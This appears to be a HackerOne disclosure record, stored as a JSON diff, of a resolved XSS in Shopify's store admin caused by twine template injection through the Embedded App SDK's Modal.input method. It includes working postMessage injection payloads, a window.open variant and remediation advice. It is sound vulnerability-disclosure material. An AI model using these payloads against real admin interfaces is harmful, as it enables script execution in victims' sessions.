@@ -1,0 +1,326 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-06-01T16:42:17.009Z", 
+    "voters": [
+        "michiel", 
+        "bl4de", 
+        "secator", 
+        "spam404", 
+        "gerben_javado", 
+        "dawgyg", 
+        "cdl", 
+        "bogdantcaciuc", 
+        "glc", 
+        "ysx", 
+        "and 19 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "1000.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 217790, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-05-29T19:13:01.081Z", 
+    "vulnerability_information": "#Description\nThe Shopify [Embedded App SDK](https://help.shopify.com/api/sdks/merchant-apps/embedded-app-sdk) is used to facilitate limited interactions with parent page (`/admin/apps/$id`) from an embedded app within the shop admin interface. The SDK has multiple methods which allow an app to interact with the user which execute in the context of the admin domain and pass information back to the app. These UI elements are rendered from predefined templates using [lodash](https://lodash.com)'s [_.template](https://lodash.com/docs/4.17.4#template) method. While the method automatically provides input escaping the \"input\" template (used by the `Shopify.API.Modal.input` method) assigns a value to a special `data-define` attribute. While it's not possible to escape the attribute context, because the escaping is not fully context-aware it is possible to inject additional data into the attribute which is later interpreted by [twine](http://shopify.github.io/twine/). Because twine does not execute in a sandbox this template becomes an eval primitive and it possible to obtain XSS in the context of the parent application. \n\n#Technical Details\nWhen the `Shopify.API.Modal.input` method the following \"input\" template is rendered using [lodash](https://lodash.com)'s [_.template](https://lodash.com/docs/4.17.4#template) method: \n```html\n...\n<div class=\"ui-modal__body\" data-define=\"{typedInput: &#39;[%= value %]&#39;}\">\n...\n<label class=\"next-label\" for=\"text-a10e7047a92878fc20031f40da0b5231\"></label>\n<input type=\"text\" id=\"text-a10e7047a92878fc20031f40da0b5231\" data-bind=\"typedInput\" autofocus=\"autofocus\" class=\"next-input\" />\n...\n<button class=\"btn close-modal [%= buttonClass %]\" data-bind-event-click=\"closeModal({result: true, data: typedInput})\" type=\"button\" name=\"button\">[%= okButton %]</button>\n...\n```\nThe `typedInput` parameter is initialized from the `value` template parameter, bound to the text input, and finally used when the \"okButton\" is clicked. The data binding is handled by Shopify's [twine](http://shopify.github.io/twine/) JS library. Unfortunately because  [_.template](https://lodash.com/docs/4.17.4#template) is not fully context aware it will not provide JSON escaping for this parameter. For example if `value` is set to `some'value` the following invalid JSON will be created in the `data-define` attribute:\n```\n{typedInput: 'some'value'}\n```\nNormally this would just break the intended functionality, however if we analyze [twine](http://shopify.github.io/twine/) we can discover that this type of injection can actually result in arbitrary JS execution. Twine evaluates parameters using the (wrapFunctionString)[https://github.com/Shopify/twine/blob/24c4ccfccf5b50937e6d9e433676651549be1497/dist/twine.js#L373] method:\n```js\nwrapFunctionString = function(code, args, node) {\n  var e, error, keypath;\n  if (isKeypath(code) && (keypath = keypathForKey(node, code))) {\n    if (keypath[0] === '$root') {\n      return function($context, $root) {\n        return getValue($root, keypath);\n      };\n    } else {\n      return function($context, $root) {\n        return getValue($context, keypath);\n      };\n    }\n  } else {\n    code = \"return \" + code;\n    if (nodeArrayIndexes(node)) {\n      code = \"with($arrayPointers) { \" + code + \" }\";\n    }\n    if (requiresRegistry(args)) {\n      code = \"with($registry) { \" + code + \" }\";\n    }\n    try {\n      return new Function(args, \"with($context) { \" + code + \" }\");\n    } catch (error) {\n      e = error;\n      throw \"Twine error: Unable to create function on \" + node.nodeName + \" node with attributes \" + (stringifyNodeAttributes(node));\n    }\n  }\n};\n``` \nThe method wraps the attribute value in a [with](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) block to provide named variables and passes it to a [Function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) constructor which acts as a eval primitive. This means any injection will result in JavaScript execution. For example, if the following data is used for the `value` template parameter it will flow as follows:\n```\n'-alert(document.domain)-'\n``` \nThis will result in a `data-define` attribute with the following value:\n```js\n{typedInput:''-document.domain-''}\n```\nThis will result in the following code executing within twine:\n```js\nwith($context) {\n  with($registry) {\n    return {typedInput: ''-alert(document.domain)-''}\n  }\n}\n```\nPutting this all together with the SDK we get the following script:\n```js\nwindow.parent.postMessage(JSON.stringify({\n  message: \"Shopify.API.Modal.input\",\n  data: {\n    message: {\n      message: \"\", \n      value: \"'-alert(document.domain)-'\",\n    }\n  }\n}), \"*\");\n```\n#Exploitability\nYou need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application. \n\n#Proof of Concept\nI've created an example malicious application associated with my partner account `shopify-whitehat-1@bored.engineer` to demonstrate the issue...\nOpen the following URL on on `$your-shop$.myshopify.com`:\n```\n/admin/oauth/authorize?client_id=5b7bd427b8caa69610bf85d1c87d4a04&scope=read_products&redirect_uri=https://attackerdoma.in/a4d76231-8657-48ed-8800-f1b02c7bb2ff.html&state=nonce\n```\nAfter authorizing the application an alert should appear on the `/admin` window containing `document.domain`.\n\n#Remediation\nThe \"input\" template should be updated to make the `value` parameter context-aware, perhaps wrapping in a `JSON.stringify` call.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "high", 
+        "author_type": "User"
+    }, 
+    "title": "XSS in $shop$.myshopify.com/admin/ via twine template injection in \"Shopify.API.Modal.input\" method when using a malicious app", 
+    "is_member_of_team?": null, 
+    "vote_count": 29, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 4254, 
+            "content": "This report demonstrated an XSS that could be exploited by a malicious application installed on a store to execute javascript as a store administrator. The cause of the XSS turned out to be improperly escaped user input in a lodash template.", 
+            "content_html": "<p>This report demonstrated an XSS that could be exploited by a malicious application installed on a store to execute javascript as a store administrator. The cause of the XSS turned out to be improperly escaped user input in a lodash template.</p>\n"
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": null, 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$1,000", 
+    "singular_disclosure_disabled": true, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-04-03T15:58:47.520Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-03T15:58:47.520Z", 
+            "actor": {
+                "username": "bored-engineer", 
+                "url": "/bored-engineer", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/328/1b156e9f7c558cb2b9910d7b538b1d0190f5d1b9_medium.png?1467257466"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "I wanted to add a quick note to this one, technically this issue doesn't require an admin to install a malicious application to be exploited. If a bad actor were already aware that an administrator uses an application hosted on `example.com`, they could search for XSS issues on `example.com` and using a combination of `var win = window.open(\"$shop$.myshopify.com/admin/apps/$id\")` and `win.postMessage` from the XSS they could likely trigger this issue. I hesitate to even mention this as is a very contrived example, however it's worth mentioning as normally XSS on the application domain wouldn't have much impact with the app being iframed to a specific URL on the application domain.", 
+            "markdown_message": "<p>I wanted to add a quick note to this one, technically this issue doesn&#39;t require an admin to install a malicious application to be exploited. If a bad actor were already aware that an administrator uses an application hosted on <code>example.com</code>, they could search for XSS issues on <code>example.com</code> and using a combination of <code>var win = window.open(&quot;$shop$.myshopify.com/admin/apps/$id&quot;)</code> and <code>win.postMessage</code> from the XSS they could likely trigger this issue. I hesitate to even mention this as is a very contrived example, however it&#39;s worth mentioning as normally XSS on the application domain wouldn&#39;t have much impact with the app being iframed to a specific URL on the application domain.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1580768, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-04-03T16:24:10.841Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-03T16:24:37.557Z", 
+            "actor": {
+                "username": "bored-engineer", 
+                "url": "/bored-engineer", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/328/1b156e9f7c558cb2b9910d7b538b1d0190f5d1b9_medium.png?1467257466"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "To provide a PoC for the scenario described in my previous comment, consider a shop that has the \"Product Reviews\" application installed which is hosted on [productreviews.shopifyapps.com](https://productreviews.shopifyapps.com/). Normally, if I were to discover XSS on a specific endpoint such as [/XSS](https://productreviews.shopifyapps.com/XSS) it wouldn't directly affect the app since a specific endpoint is loaded within the administrative interface, not the endpoint with my XSS. Ignoring that this isn't quite true due to the proxy configuration of this specific app, I would be able to use this XSS to target a specific shop. If you open any URL on [productreviews.shopifyapps.com](https://productreviews.shopifyapps.com/) and run the following JS in the console (to simulate another XSS issue) it will fire an alert in the admin panel:\n```js\nvar win = window.open(\"https://$shop$.myshopify.com/admin/apps/product-reviews/\");\nsetInterval(function() {\n  win.postMessage(JSON.stringify({\n    message: \"Shopify.API.Modal.input\",\n    data: {\n      message: {\n        message: \"\", \n        value: \"'-alert(document.domain)-'\",\n      }\n    }\n  }), \"*\");\n}, 100);\n```\nThe core issue here is the still twine injection, however you may want to consider adding an additional verification step to the `window.onmessage` handler in the admin interface. One way to accomplish this would be to provide a secret (randomly generated) to the app when first initializing, then requiring all postMessage calls from the app include this secret before being evaluated, thereby assuring all messages originated from the app's iframe. ", 
+            "markdown_message": "<p>To provide a PoC for the scenario described in my previous comment, consider a shop that has the &quot;Product Reviews&quot; application installed which is hosted on <a href=\"/redirect?signature=8829de1ff742c3d5496d407835040b23cce4d30f&amp;url=https%3A%2F%2Fproductreviews.shopifyapps.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>productreviews.shopifyapps.com</span><i class=\"icon-external-link\"></i></a>. Normally, if I were to discover XSS on a specific endpoint such as <a href=\"/redirect?signature=77810e0d78d5d354ef06ac69a91ac20a04a02a4c&amp;url=https%3A%2F%2Fproductreviews.shopifyapps.com%2FXSS\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>/XSS</span><i class=\"icon-external-link\"></i></a> it wouldn&#39;t directly affect the app since a specific endpoint is loaded within the administrative interface, not the endpoint with my XSS. Ignoring that this isn&#39;t quite true due to the proxy configuration of this specific app, I would be able to use this XSS to target a specific shop. If you open any URL on <a href=\"/redirect?signature=8829de1ff742c3d5496d407835040b23cce4d30f&amp;url=https%3A%2F%2Fproductreviews.shopifyapps.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>productreviews.shopifyapps.com</span><i class=\"icon-external-link\"></i></a> and run the following JS in the console (to simulate another XSS issue) it will fire an alert in the admin panel:</p>\n<pre class=\"highlight javascript\"><code><span class=\"kd\">var</span> <span class=\"nx\">win</span> <span class=\"o\">=</span> <span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">open</span><span class=\"p\">(</span><span class=\"s2\">&quot;https://$shop$.myshopify.com/admin/apps/product-reviews/&quot;</span><span class=\"p\">);</span>\n<span class=\"nx\">setInterval</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"nx\">win</span><span class=\"p\">.</span><span class=\"nx\">postMessage</span><span class=\"p\">(</span><span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">({</span>\n    <span class=\"na\">message</span><span class=\"p\">:</span> <span class=\"s2\">&quot;Shopify.API.Modal.input&quot;</span><span class=\"p\">,</span>\n    <span class=\"na\">data</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n      <span class=\"na\">message</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n        <span class=\"na\">message</span><span class=\"p\">:</span> <span class=\"s2\">&quot;&quot;</span><span class=\"p\">,</span> \n        <span class=\"na\">value</span><span class=\"p\">:</span> <span class=\"s2\">&quot;&#39;-alert(document.domain)-&#39;&quot;</span><span class=\"p\">,</span>\n      <span class=\"p\">}</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}),</span> <span class=\"s2\">&quot;*&quot;</span><span class=\"p\">);</span>\n<span class=\"p\">},</span> <span class=\"mi\">100</span><span class=\"p\">);</span>\n</code></pre>\n<p>The core issue here is the still twine injection, however you may want to consider adding an additional verification step to the <code>window.onmessage</code> handler in the admin interface. One way to accomplish this would be to provide a secret (randomly generated) to the app when first initializing, then requiring all postMessage calls from the app include this secret before being evaluated, thereby assuring all messages originated from the app&#39;s iframe. </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1580855, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-04-03T20:39:25.492Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-03T20:39:25.492Z", 
+            "actor": {
+                "username": "jenn-shopify", 
+                "url": "/jenn-shopify", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Thank you for your report and the additional info! Our engineering team is investigating this issue.", 
+            "markdown_message": "<p>Thank you for your report and the additional info! Our engineering team is investigating this issue.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 1581653, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "bored-engineer", 
+                "url": "/bored-engineer"
+            }, 
+            "created_at": "2017-05-05T17:50:14.275Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-05T17:50:14.275Z", 
+            "actor": {
+                "username": "jenn-shopify", 
+                "url": "/jenn-shopify", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Thanks again for your report! This issue has been resolved.\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.", 
+            "markdown_message": "<p>Thanks again for your report! This issue has been resolved.</p>\n\n<p>Our next round of bounty decisions will take place within two weeks, so we&#39;ll be in touch with you again soon.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1656962, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-05-29T19:12:50.447Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-29T19:12:50.447Z", 
+            "actor": {
+                "url": "/shopify", 
+                "profile": {
+                    "name": "Shopify"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
+                }
+            }, 
+            "team_handle": "shopify", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "1000.0", 
+            "collaborator": {
+                "username": "bored-engineer", 
+                "url": "/bored-engineer"
+            }, 
+            "message": "As usual, thanks for this detailed report. We've considered a few factors to set the reward amount for this one. The issue would not have been directly exploitable to an unauthenticated user (it requires another XSS on specific domains or control of a malicious app), however it's reasonable to think these conditions can be achieved with a bit of extra work by the attacker. Additionally, we reviewed other templates for similar issues while investigating a solution for this report.", 
+            "markdown_message": "<p>As usual, thanks for this detailed report. We&#39;ve considered a few factors to set the reward amount for this one. The issue would not have been directly exploitable to an unauthenticated user (it requires another XSS on specific domains or control of a malicious app), however it&#39;s reasonable to think these conditions can be achieved with a bit of extra work by the attacker. Additionally, we reviewed other templates for similar issues while investigating a solution for this report.</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1708003, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-29T19:13:01.098Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-29T19:13:01.098Z", 
+            "actor": {
+                "username": "francoischagnon", 
+                "url": "/francoischagnon", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/168/3b5130025fbf90eaeb1c9234baa340dfead68f44_medium.jpg?1429126005"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1708004, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-01T16:42:17.028Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-01T16:42:17.028Z", 
+            "actor": {
+                "username": "bored-engineer", 
+                "url": "/bored-engineer", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/328/1b156e9f7c558cb2b9910d7b538b1d0190f5d1b9_medium.png?1467257466"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1721822, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-01T16:42:17.072Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-01T16:42:17.072Z", 
+            "actor": {
+                "username": "bored-engineer", 
+                "url": "/bored-engineer", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/328/1b156e9f7c558cb2b9910d7b538b1d0190f5d1b9_medium.png?1467257466"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1721823, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "reporter": {
+        "username": "bored-engineer", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/bored-engineer", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/007/328/369436c6c39c8338c3bd3c96466f58fd2b4bee1d_small.png?1467257466"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 60, 
+        "name": "Cross-site Scripting (XSS) - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "disclosed_at": "2017-06-01T16:42:17.056Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/217790", 
+    "created_at": "2017-04-02T02:33:01.281Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h1 id=\"description\">Description</h1>\n\n<p>The Shopify <a href=\"/redirect?signature=17e4381a12866d947b44df766c59d40210fee3c6&amp;url=https%3A%2F%2Fhelp.shopify.com%2Fapi%2Fsdks%2Fmerchant-apps%2Fembedded-app-sdk\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Embedded App SDK</span><i class=\"icon-external-link\"></i></a> is used to facilitate limited interactions with parent page (<code>/admin/apps/$id</code>) from an embedded app within the shop admin interface. The SDK has multiple methods which allow an app to interact with the user which execute in the context of the admin domain and pass information back to the app. These UI elements are rendered from predefined templates using <a href=\"/redirect?signature=9bf108578a459c4690bc843f7abed7a9a555a31b&amp;url=https%3A%2F%2Flodash.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>lodash</span><i class=\"icon-external-link\"></i></a>&#39;s <a href=\"/redirect?signature=61407838421fab0184de3ac8286a6be3c2aa648a&amp;url=https%3A%2F%2Flodash.com%2Fdocs%2F4.17.4%23template\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>_.template</span><i class=\"icon-external-link\"></i></a> method. While the method automatically provides input escaping the &quot;input&quot; template (used by the <code>Shopify.API.Modal.input</code> method) assigns a value to a special <code>data-define</code> attribute. While it&#39;s not possible to escape the attribute context, because the escaping is not fully context-aware it is possible to inject additional data into the attribute which is later interpreted by <a href=\"/redirect?signature=5dd7392961db050864c357f330bababff06936ce&amp;url=http%3A%2F%2Fshopify.github.io%2Ftwine%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>twine</span><i class=\"icon-external-link\"></i></a>. Because twine does not execute in a sandbox this template becomes an eval primitive and it possible to obtain XSS in the context of the parent application. </p>\n\n<h1 id=\"technical-details\">Technical Details</h1>\n\n<p>When the <code>Shopify.API.Modal.input</code> method the following &quot;input&quot; template is rendered using <a href=\"/redirect?signature=9bf108578a459c4690bc843f7abed7a9a555a31b&amp;url=https%3A%2F%2Flodash.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>lodash</span><i class=\"icon-external-link\"></i></a>&#39;s <a href=\"/redirect?signature=61407838421fab0184de3ac8286a6be3c2aa648a&amp;url=https%3A%2F%2Flodash.com%2Fdocs%2F4.17.4%23template\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>_.template</span><i class=\"icon-external-link\"></i></a> method: </p>\n<pre class=\"highlight html\"><code>...\n<span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">&quot;ui-modal__body&quot;</span> <span class=\"na\">data-define=</span><span class=\"s\">&quot;{typedInput: &amp;#39;[%= value %]&amp;#39;}&quot;</span><span class=\"nt\">&gt;</span>\n...\n<span class=\"nt\">&lt;label</span> <span class=\"na\">class=</span><span class=\"s\">&quot;next-label&quot;</span> <span class=\"na\">for=</span><span class=\"s\">&quot;text-a10e7047a92878fc20031f40da0b5231&quot;</span><span class=\"nt\">&gt;&lt;/label&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;text&quot;</span> <span class=\"na\">id=</span><span class=\"s\">&quot;text-a10e7047a92878fc20031f40da0b5231&quot;</span> <span class=\"na\">data-bind=</span><span class=\"s\">&quot;typedInput&quot;</span> <span class=\"na\">autofocus=</span><span class=\"s\">&quot;autofocus&quot;</span> <span class=\"na\">class=</span><span class=\"s\">&quot;next-input&quot;</span> <span class=\"nt\">/&gt;</span>\n...\n<span class=\"nt\">&lt;button</span> <span class=\"na\">class=</span><span class=\"s\">&quot;btn close-modal [%= buttonClass %]&quot;</span> <span class=\"na\">data-bind-event-click=</span><span class=\"s\">&quot;closeModal({result: true, data: typedInput})&quot;</span> <span class=\"na\">type=</span><span class=\"s\">&quot;button&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;button&quot;</span><span class=\"nt\">&gt;</span>[%= okButton %]<span class=\"nt\">&lt;/button&gt;</span>\n...\n</code></pre>\n<p>The <code>typedInput</code> parameter is initialized from the <code>value</code> template parameter, bound to the text input, and finally used when the &quot;okButton&quot; is clicked. The data binding is handled by Shopify&#39;s <a href=\"/redirect?signature=5dd7392961db050864c357f330bababff06936ce&amp;url=http%3A%2F%2Fshopify.github.io%2Ftwine%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>twine</span><i class=\"icon-external-link\"></i></a> JS library. Unfortunately because  <a href=\"/redirect?signature=61407838421fab0184de3ac8286a6be3c2aa648a&amp;url=https%3A%2F%2Flodash.com%2Fdocs%2F4.17.4%23template\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>_.template</span><i class=\"icon-external-link\"></i></a> is not fully context aware it will not provide JSON escaping for this parameter. For example if <code>value</code> is set to <code>some&#39;value</code> the following invalid JSON will be created in the <code>data-define</code> attribute:</p>\n<pre class=\"highlight plaintext\"><code>{typedInput: &#39;some&#39;value&#39;}\n</code></pre>\n<p>Normally this would just break the intended functionality, however if we analyze <a href=\"/redirect?signature=5dd7392961db050864c357f330bababff06936ce&amp;url=http%3A%2F%2Fshopify.github.io%2Ftwine%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>twine</span><i class=\"icon-external-link\"></i></a> we can discover that this type of injection can actually result in arbitrary JS execution. Twine evaluates parameters using the (wrapFunctionString)[<a title=\"https://github.com/Shopify/twine/blob/24c4ccfccf5b50937e6d9e433676651549be1497/dist/twine.js#L373\" href=\"/redirect?signature=4c80a33c96ae3d6dca7641b96659310731f62d28&amp;url=https%3A%2F%2Fgithub.com%2FShopify%2Ftwine%2Fblob%2F24c4ccfccf5b50937e6d9e433676651549be1497%2Fdist%2Ftwine.js%23L373\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/Shopify/twine/blob/24c4ccfccf5b50937e6d9e433676651549be1497/dist/twine.js#L373</span><i class=\"icon-external-link\"></i></a>] method:</p>\n<pre class=\"highlight javascript\"><code><span class=\"nx\">wrapFunctionString</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">code</span><span class=\"p\">,</span> <span class=\"nx\">args</span><span class=\"p\">,</span> <span class=\"nx\">node</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">e</span><span class=\"p\">,</span> <span class=\"nx\">error</span><span class=\"p\">,</span> <span class=\"nx\">keypath</span><span class=\"p\">;</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">isKeypath</span><span class=\"p\">(</span><span class=\"nx\">code</span><span class=\"p\">)</span> <span class=\"o\">&amp;&amp;</span> <span class=\"p\">(</span><span class=\"nx\">keypath</span> <span class=\"o\">=</span> <span class=\"nx\">keypathForKey</span><span class=\"p\">(</span><span class=\"nx\">node</span><span class=\"p\">,</span> <span class=\"nx\">code</span><span class=\"p\">)))</span> <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">keypath</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">===</span> <span class=\"s1\">&#39;$root&#39;</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"k\">return</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$context</span><span class=\"p\">,</span> <span class=\"nx\">$root</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"k\">return</span> <span class=\"nx\">getValue</span><span class=\"p\">(</span><span class=\"nx\">$root</span><span class=\"p\">,</span> <span class=\"nx\">keypath</span><span class=\"p\">);</span>\n      <span class=\"p\">};</span>\n    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n      <span class=\"k\">return</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$context</span><span class=\"p\">,</span> <span class=\"nx\">$root</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"k\">return</span> <span class=\"nx\">getValue</span><span class=\"p\">(</span><span class=\"nx\">$context</span><span class=\"p\">,</span> <span class=\"nx\">keypath</span><span class=\"p\">);</span>\n      <span class=\"p\">};</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n    <span class=\"nx\">code</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;return &quot;</span> <span class=\"o\">+</span> <span class=\"nx\">code</span><span class=\"p\">;</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">nodeArrayIndexes</span><span class=\"p\">(</span><span class=\"nx\">node</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n      <span class=\"nx\">code</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;with($arrayPointers) { &quot;</span> <span class=\"o\">+</span> <span class=\"nx\">code</span> <span class=\"o\">+</span> <span class=\"s2\">&quot; }&quot;</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">requiresRegistry</span><span class=\"p\">(</span><span class=\"nx\">args</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n      <span class=\"nx\">code</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;with($registry) { &quot;</span> <span class=\"o\">+</span> <span class=\"nx\">code</span> <span class=\"o\">+</span> <span class=\"s2\">&quot; }&quot;</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">try</span> <span class=\"p\">{</span>\n      <span class=\"k\">return</span> <span class=\"k\">new</span> <span class=\"nb\">Function</span><span class=\"p\">(</span><span class=\"nx\">args</span><span class=\"p\">,</span> <span class=\"s2\">&quot;with($context) { &quot;</span> <span class=\"o\">+</span> <span class=\"nx\">code</span> <span class=\"o\">+</span> <span class=\"s2\">&quot; 